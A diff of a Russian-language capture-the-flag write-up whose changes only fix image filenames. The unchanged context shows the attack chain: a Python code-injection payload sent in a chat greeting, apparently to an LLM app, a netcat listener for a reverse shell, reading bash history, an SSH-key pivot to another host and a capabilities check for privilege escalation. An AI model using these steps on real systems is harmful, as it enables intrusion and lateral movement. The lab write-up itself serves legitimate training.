@@ -44,7 +44,7 @@ http://[HOST]:[PORT]
 ```text
 Привет {__import__('os').popen('whoami').read()}
 ```
-![image](./images/image1)
+![image](./images/image1.png)
 Ответ: `llmuser`
 
 Получаем reverse shell. На своей машине запускаем:
@@ -60,7 +60,7 @@ nc -lvnp 4444
 ```
 
 Заменяем `YOUR_IP` на свой IP-адрес.
-![image](./images/image2)
+![image](./images/image2.png)
 
 ### Этап 3: Исследование системы
 
@@ -75,7 +75,7 @@ cat /home/llmuser/.bash_history
 ```text
 ssh -i /home/llmuser/.ssh/id_rsa target@192.168.90.10
 ```
-![image](./images/image3)
+![image](./images/image3.png)
 ### Этап 6: Повышение привилегий
 
 На целевом сервере проверяем capabilities:
@@ -122,3 +122,4 @@ vka{CHTO_ZA_PIZDEC_I_RESHIL}
 
 
 ---
+
